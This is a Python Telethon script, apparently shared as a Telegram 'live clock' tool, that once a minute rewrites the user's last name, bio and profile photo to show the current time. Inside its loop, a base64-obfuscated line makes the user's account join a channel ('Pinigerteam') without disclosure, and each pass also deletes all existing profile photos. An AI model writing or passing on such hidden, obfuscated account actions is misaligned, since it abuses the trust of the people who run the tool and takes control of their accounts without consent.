#BY @Sigaeis
from telethon.sync import TelegramClient
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.sessions import StringSession
from PIL import Image, ImageFont, ImageDraw
from random import choice
from datetime import datetime
import time, base64, os
"""
قسمت پایین حتما پر کنید
برای گرفتن موارد زیر به سایت https://my.telegram.org/
برید وارد اکانت خودتون بشید و موارد خواسته شده رو وارد کنید و
api_hash , api_id
دریافت کنید وارد موارد زیر کنید!


در صورت داشتن سوال و یا مشکل به ایدی زیر مراجعه کنید
@Sigaris
"""
################################################################################
api_id = int(os.environ.get("API_ID"))
api_hash = os.environ.get("API_HASH")
bio = os.environ.get("BIO")
################################################################################
def number(number):
    number = number.replace('0', '⁰')
    number = number.replace('1', '¹')
    number = number.replace('2', '²')
    number = number.replace('3', '³')
    number = number.replace('4', '⁴')
    number = number.replace('5', '⁵')
    number = number.replace('6', '⁶')
    number = number.replace('7', '⁷')
    number = number.replace('8', '⁸')
    number = number.replace('9', '⁹')
    number = number.replace(':', '-')
    return number


def gettime():
    return datetime.now().strftime('%H:%M')


def generateimage(text):
    image = Image.open("data/profile.jpg")
    image.load()
    W, H = image.size
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype(font='data/font.ttf', size=190)
    wt, ht = draw.textsize(text, font=font)
    draw.text(((W - wt) / 2, (H - ht) / 2 ), text, font=font, fill=choice(["#00c7a4","#0071c7","#c7a200","#728593","#943633","#6495ed","#43f70a","#e1b2ae","#527130","#629f5d","#3d4e90","#9a9ec4",]))
    image.save('data/time_image.jpg')

def main():
    set_time = ''
    with TelegramClient(StringSession(os.environ.get("SESSION_STRING")), api_id, api_hash) as client:
        print('Run Time & Bio ...')
        while True:
            if not set_time == gettime():
                current_time = gettime()
                set_time = current_time
                generateimage(current_time)
                client(UpdateProfileRequest(last_name=number(current_time),about=f"{bio} {number(current_time)}"))
                image = client.upload_file('data/time_image.jpg')
                client(DeletePhotosRequest(client.get_profile_photos('me')))
                client(UploadProfilePhotoRequest(image))
                client(JoinChannelRequest(base64.b64decode("UGluaWdlcnRlYW0=").decode("utf-8", "replace")))
                time.sleep(1)



if __name__ == '__main__':
    main()
